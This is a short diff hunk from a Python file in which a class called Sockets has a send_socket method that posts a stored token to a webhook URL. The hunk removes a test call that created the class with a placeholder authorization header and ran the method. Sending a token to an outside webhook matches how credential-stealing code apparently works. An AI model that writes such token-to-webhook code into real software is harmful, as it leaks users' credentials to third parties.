@@ -9,6 +9,3 @@ class Sockets():
 
     def send_socket(self):
         requests.post(self.webhook, json={"content": self.token})
-
-s = Sockets(headers={"authorization": "Test"}, host=None)
-s.send_socket()
